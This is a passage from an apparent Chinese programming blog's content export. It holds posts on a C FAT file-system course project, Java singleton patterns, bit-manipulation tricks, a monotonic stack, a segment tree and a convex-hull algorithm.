d.FAT[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        <span class="keyword">for</span> (k = <span class="number">1</span>; k &lt;= <span class="number">114</span>; k++) <span class="built_in">printf</span>(<span class="string">"-"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 初始化磁盘 即格式化</span></span><br><span class="line">    intial();</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">exit</span> = <span class="number">0</span>, choice;</span><br><span class="line">    <span class="keyword">while</span> (!<span class="built_in">exit</span>) &#123;</span><br><span class="line">        system(<span class="string">"cls"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"1.创建文件\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"2.读取文件\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"3.写入文件\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"4.删除文件\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"5.显示示位图\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"6.列出所有文件\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"7.打印FAT\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"0.退出系统\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;choice);</span><br><span class="line">        <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                tryCreate();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                tryRead();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                tryWrite();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                tryDelete();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                showBitmap();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                showFiles();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                showFAT();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">exit</span> = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"输入有误，请重新输入！\n"</span>);</span><br><span class="line">                system(<span class="string">"pause"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h2><p>在验收前的十几分钟突然发现<code>getFreeBlock()</code>函数有<code>bug</code>，当时立马从腾讯会议中退出来，测试了好久发现是<code>for</code>循环有问题，之前的写法是这样：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (; i &lt; <span class="number">7</span>; i =( i + <span class="number">1</span> ) % <span class="number">7</span>)</span><br><span class="line">	<span class="keyword">for</span> (; j &lt; <span class="number">16</span>; j = (j + <span class="number">1</span>) % <span class="number">16</span>) &#123;</span><br><span class="line">                </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样子内循环一直结束不了，造成了死循环。之前一直没发现这个问题是因为之前测试的时候，一般不会把文件大小改得很大，所以不会触发这个循环。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>课程设计</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈设计模式之单例模式</title>
    <url>/2020/05/07/%E6%B5%85%E8%B0%88%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<p>单例模式： 保证一个类仅有一个实例，并提供一个访问它的全局访问点， 目的是为了保证在一个进程中，某个类有且仅有一个实例。 </p>
<p>要做到这点，必须将构造方法进行私有，防止外部通过构造方法进行实例化该类，在类内部提供方法引用唯一创建的实例。<a id="more"></a></p>
<h2 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h2><h3 id="懒汉模式"><a href="#懒汉模式" class="headerlink" title="懒汉模式"></a>懒汉模式</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> study.design.singleton;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样外部类就不能通过构造方法进行实例化该类，只能通过<code>Singleton.getInstance()</code>的方式进行获取唯一的对象。但是很遗憾，该方式没有考虑多线程的情况，不同的线程同时调用<code>Singleton.getInstance()</code>的时候很有可能会实例化多个对象。因此需要对<code>getInstance()</code>进行加锁</p>
<h3 id="加强版懒汉模式（线程安全）"><a href="#加强版懒汉模式（线程安全）" class="headerlink" title="加强版懒汉模式（线程安全）"></a>加强版懒汉模式（线程安全）</h3><p>给加上<code>getInstance()</code>，加上<code>synchronized</code>关键字</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> study.design.singleton;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样多线程并发执行<code>getInstance()</code>的时候，就只有最早拿到锁的线程能够执行<code>instance = new Singleton()</code>，其他的线程从阻塞队列中下来的时候<code>Singleton</code>已经被实例化了，因此不会执行<code>instance = new Singleton()</code>，从而确保多线程安全。 遗憾的是，由于synchronized的存在，效率很低，在单线程的情景下，完全可以去掉synchronized，为了兼顾效率与性能问题，改进后代码如下： </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> study.design.singleton;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该方法也叫<strong>“双重校验法”</strong>，在<code>instance != null</code>的时候，就不会进行加锁操作，提升了系统性能。但是理论是美好的，而现实是残酷的， 由于Java的内存模型 ，上述代码在执行期间还是有些不同，具体参照<a href="https://blog.csdn.net/chenchaofuck1/article/details/51702129" target="_blank" rel="noopener">这篇文章</a></p>
<h3 id="饿汉模式"><a href="#饿汉模式" class="headerlink" title="饿汉模式"></a>饿汉模式</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> study.design.singleton;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance = <span class="keyword">new</span> Singleton();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该模式在加载该类的时候直接实例化该类，因此不管用与不用都占着空间，如果项目中有大量单例对象，则可能会浪费大量内存空间 </p>
<h3 id="静态内部类加载"><a href="#静态内部类加载" class="headerlink" title="静态内部类加载"></a>静态内部类加载</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> study.design.singleton;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> SingletonHolder.instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SingletonHolder</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该模式在加载<code>Singleton</code>类的时候不会直接实例化该类，而是调用<code>getInstance()</code>后才实例化<code>Singleton</code>类，做到了懒加载的效果，而且是线程安全的。</p>
<h3 id="借助枚举类"><a href="#借助枚举类" class="headerlink" title="借助枚举类"></a>借助枚举类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> study.design.singleton;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> Singleton &#123;</span><br><span class="line">    INSTANCE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>是不是十分的简洁？这种方式解决了以下三个问题：</p>
<ul>
<li>自由序列化。关于序列化，<a href="https://www.runoob.com/java/java-serialization.html" target="_blank" rel="noopener">这里</a>有比较详细的介绍</li>
<li>保证只有一个实例。</li>
<li>线程安全。</li>
</ul>
<p>引用实例对象的时候只需要：<code>Singleton singleton = Singleton.INSTANCE</code>即可，当然了，我们也可以像常规类一样添加变量和方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> study.design.singleton;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> Singleton &#123;</span><br><span class="line">    INSTANCE;</span><br><span class="line">    <span class="keyword">private</span> String name = <span class="string">"INSTANCE"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用的时候只需<code>Singleton.INSTANCE.getName()</code>。</p>
<p>但是在<code>Android</code>平台上面，<code>Android</code>官方不建议使用枚举类实现单例， 因为内存消耗会其他方式多一些 。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>单例的实现方式有多种，该怎么选择需要根据实际情况考虑，如果说不考虑多线程则直接使用懒汉模式，简单又节约，如果说考虑多线程则建议使用双重校验法或者静态内部法，或者如果说确保项目中使用单例情况非常少，则可以考虑使用枚举实现。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>单例模式</tag>
      </tags>
  </entry>
  <entry>
    <title>算法模板之位操作</title>
    <url>/2020/08/24/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF%E4%B9%8B%E4%BD%8D%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<p>在计算机中，对数据进行位操作具有十分高的效率，就拿乘法来说，假如乘数是一个2<sup>N</sup>形式的数字，那么就可以使用左移的方式，例如：<code>n * 2 == n &lt;&lt; 1、n * 8 == n &lt;&lt; 3、n / 16 == n &gt;&gt; 4、</code>，实际上位操作还有其他更高级的用法：<a id="more"></a></p>
<h2 id="判断num是否是2的次幂"><a href="#判断num是否是2的次幂" class="headerlink" title="判断num是否是2的次幂"></a>判断num是否是2的次幂</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isPowerOf2</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> num &gt; <span class="number">0</span> &amp;&amp; ((num &amp; (num - <span class="number">1</span>)) == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="向上取整为2次幂"><a href="#向上取整为2次幂" class="headerlink" title="向上取整为2次幂"></a>向上取整为2次幂</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">upperPowerOf2</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((num &amp; (num - <span class="number">1</span>)) == <span class="number">0</span>) <span class="keyword">return</span> num;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">return</span> num + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="返回num的最高有效位的掩码"><a href="#返回num的最高有效位的掩码" class="headerlink" title="返回num的最高有效位的掩码"></a>返回num的最高有效位的掩码</h2><p>如i=00..1xx..，则返回00..100..</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">highestOneBit</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        num |= (num &gt;&gt;  <span class="number">1</span>);</span><br><span class="line">        num |= (num &gt;&gt;  <span class="number">2</span>);</span><br><span class="line">        num |= (num &gt;&gt;  <span class="number">4</span>);</span><br><span class="line">        num |= (num &gt;&gt;  <span class="number">8</span>);</span><br><span class="line">        num |= (num &gt;&gt; <span class="number">16</span>);</span><br><span class="line">        <span class="comment">// 无符号右移</span></span><br><span class="line">        <span class="keyword">return</span> num - (num &gt;&gt;&gt; <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="保留最右边的“1”"><a href="#保留最右边的“1”" class="headerlink" title="保留最右边的“1”"></a>保留最右边的“1”</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rightmostOneBit</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> num &amp; (~num) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="清除最右边的“1”"><a href="#清除最右边的“1”" class="headerlink" title="清除最右边的“1”"></a>清除最右边的“1”</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">clearLowestBit</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> n &amp; (n - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>位操作</tag>
      </tags>
  </entry>
  <entry>
    <title>算法模板之单调递减栈</title>
    <url>/2020/08/24/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF%E4%B9%8B%E5%8D%95%E8%B0%83%E9%80%92%E5%87%8F%E6%A0%88/</url>
    <content><![CDATA[<h2 id="模板代码"><a href="#模板代码" class="headerlink" title="模板代码"></a>模板代码</h2><a id="more"></a>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">function</span><span class="params">(<span class="keyword">int</span>[] nums)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> LEN = nums.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = LEN - <span class="number">1</span>;i &gt;= <span class="number">0</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">while</span> (!stack.empty() &amp;&amp; nums[i] &gt; stack.peek())&#123;</span><br><span class="line">            stack.pop();</span><br><span class="line">        &#125;</span><br><span class="line">        stack.push(nums[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>单调递减栈</tag>
      </tags>
  </entry>
  <entry>
    <title>线段树模板</title>
    <url>/2021/02/01/%E7%BA%BF%E6%AE%B5%E6%A0%91%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[<!--只是一个模板-->

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX_N = <span class="number">1e5</span> + <span class="number">1</span>;</span><br><span class="line"><span class="comment">// const int MAX_N = 1e2 + 1;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> LL;</span><br><span class="line">LL num[MAX_N], tree[MAX_N &lt;&lt; <span class="number">2</span>], tag[MAX_N &lt;&lt; <span class="number">2</span>];</span><br><span class="line"><span class="comment">// 对 [l,r] 区间建立线段树,当前根的编号为 nowIndex</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> nowIndex)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l == r)&#123;</span><br><span class="line">        tree[nowIndex] = num[l];</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 后序遍历的方式进行建树</span></span><br><span class="line">    build(l, mid, nowIndex &lt;&lt; <span class="number">1</span>), build(mid + <span class="number">1</span>, r, nowIndex &lt;&lt; <span class="number">1</span> | <span class="number">1</span>);</span><br><span class="line">    tree[nowIndex] = tree[nowIndex &lt;&lt; <span class="number">1</span>] + tree[nowIndex &lt;&lt; <span class="number">1</span> | <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//更新[l,r]区间（每个元素加上k），编号为 nowIndex 的节点记录[L, R]的区间和</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> L, <span class="keyword">int</span> R, <span class="keyword">int</span> nowIndex, LL k)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 如果当前区间是待修改区间的子集的时候，打上标记、更改节点值后直接返回</span></span><br><span class="line">    <span class="keyword">if</span> (l &lt;= L &amp;&amp; R &lt;= r)&#123;</span><br><span class="line">        tree[nowIndex] += (R - L + <span class="number">1</span>) * k, tag[nowIndex] += k;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid = L + R &gt;&gt; <span class="number">1</span>, leftNode = nowIndex &lt;&lt; <span class="number">1</span>, rightNode = nowIndex &lt;&lt; <span class="number">1</span> | <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 当前节点不是叶子结点、标记不为空的时候</span></span><br><span class="line">    <span class="keyword">if</span> (tag[nowIndex] &amp;&amp; L != R)&#123;</span><br><span class="line">        <span class="comment">// 将标记下传并且更新左右节点</span></span><br><span class="line">        tree[leftNode]  += tag[nowIndex] * (mid - L + <span class="number">1</span>), tree[rightNode] += tag[nowIndex] * (R - mid);</span><br><span class="line">        tag[leftNode] += tag[nowIndex], tag[rightNode] += tag[nowIndex];</span><br><span class="line">        <span class="comment">// 清空当前节点的标记</span></span><br><span class="line">        tag[nowIndex] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//如果左儿子代表的区间 [L,mid] 与修改区间有交集,则递归更新左儿子</span></span><br><span class="line">    <span class="keyword">if</span> (l &lt;= mid)update(l, r, L, mid, leftNode, k);</span><br><span class="line">    <span class="comment">//如果右儿子代表的区间 [mid + 1,R] 与修改区间有交集,则递归更新左儿子</span></span><br><span class="line">    <span class="keyword">if</span> (r &gt;= mid + <span class="number">1</span>)update(l, r, mid + <span class="number">1</span>, R, rightNode, k);</span><br><span class="line">    tree[nowIndex] = tree[leftNode] + tree[rightNode];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查询[l,r]区间，编号为 nowIndex 的节点记录[L, R]的区间和</span></span><br><span class="line"><span class="function">LL <span class="title">getSum</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> L, <span class="keyword">int</span> R, <span class="keyword">int</span> nowIndex)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 如果当前区间是待查询区间的子集的时候，直接返回</span></span><br><span class="line">    <span class="keyword">if</span> (l &lt;= L &amp;&amp; R &lt;= r)<span class="keyword">return</span> tree[nowIndex];</span><br><span class="line">    <span class="keyword">int</span> mid = L + R &gt;&gt; <span class="number">1</span>, leftNode = nowIndex &lt;&lt; <span class="number">1</span>, rightNode = nowIndex &lt;&lt; <span class="number">1</span> | <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (tag[nowIndex] &amp;&amp; L != R)&#123;</span><br><span class="line">        <span class="comment">// 将标记下传并且更新左右节点</span></span><br><span class="line">        tree[leftNode]  += tag[nowIndex] * (mid - L + <span class="number">1</span>), tree[rightNode] += tag[nowIndex] * (R - mid);</span><br><span class="line">        tag[leftNode] += tag[nowIndex], tag[rightNode] += tag[nowIndex];</span><br><span class="line">        <span class="comment">// 清空当前节点的标记</span></span><br><span class="line">        tag[nowIndex] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    LL sum = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//如果左儿子代表的区间 [L,mid] 与查询区间有交集,则递归查询左儿子</span></span><br><span class="line">    <span class="keyword">if</span> (l &lt;= mid)sum = getSum(l, r, L, mid, leftNode);</span><br><span class="line">    <span class="comment">//如果右儿子代表的区间 [mid + 1,R] 与查询区间有交集,则递归查询左儿子</span></span><br><span class="line">    <span class="keyword">if</span> (r &gt;= mid + <span class="number">1</span>)sum += getSum(l, r, mid + <span class="number">1</span>, R, rightNode);</span><br><span class="line">    <span class="keyword">return</span> sum;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>递归</tag>
        <tag>位操作</tag>
        <tag>与运算</tag>
      </tags>
  </entry>
  <entry>
    <title>计算几何之凸包</title>
    <url>/2020/10/05/%E8%AE%A1%E7%AE%97%E5%87%A0%E4%BD%95%E4%B9%8B%E5%87%B8%E5%8C%85/</url>
    <content><![CDATA[<h2 id="计算几何之凸包"><a href="#计算几何之凸包" class="headerlink" title="计算几何之凸包"></a>计算几何之凸包</h2><p>凸包的大概意思是，在点集<code>A</code>中，选取子集<code>a</code>，将<code>a</code>中的点进行连线形成多边形（假若<code>a</code>中的点共线，则将多边形视为高度为0的长方形），则<code>A</code>中的点要么在多边形内部、要么在多边形上。<a id="more"></a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 100</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Point</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line">&#125;;</span><br><span class="line">Point points[MAXN + <span class="number">1</span>];</span><br><span class="line">Point <span class="built_in">stack</span>[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> length;</span><br><span class="line"><span class="comment">// 向量叉积</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mul</span><span class="params">(Point a, Point b, Point c)</span> </span>&#123; <span class="keyword">return</span> (b.x - a.x) * (c.y - b.y) - (c.x - b.x) * (b.y - a.y); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">andrew</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> top1 = <span class="number">0</span>, top2;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">       <span class="comment">// 如果取 &lt;= 则不包含共线情况</span></span><br><span class="line">        <span class="keyword">while</span> (top1 &gt; <span class="number">1</span> &amp;&amp; mul(<span class="built_in">stack</span>[top1 - <span class="number">2</span>], <span class="built_in">stack</span>[top1 - <span class="number">1</span>], points[i]) &lt;= <span class="number">0</span>) top1--;</span><br><span class="line">        <span class="built_in">stack</span>[top1++] = points[i];</span><br><span class="line">    &#125;</span><br><span class="line">    top2 = top1;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">while</span> (top1 &gt; top2 &amp;&amp; mul(<span class="built_in">stack</span>[top1 - <span class="number">2</span>], <span class="built_in">stack</span>[top1 - <span class="number">1</span>], points[i]) &lt;= <span class="number">0</span>) top1--;</span><br><span class="line">        <span class="built_in">stack</span>[top1++] = points[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(Point a, Point b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a.x == b.x) <span class="keyword">return</span> a.y &lt; b.y;</span><br><span class="line">    <span class="keyword">return</span> a.x &lt; b.x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>凸包</tag>
      </tags>
  </entry>
  <entry>
    <title>算法模板之快速排序</title>
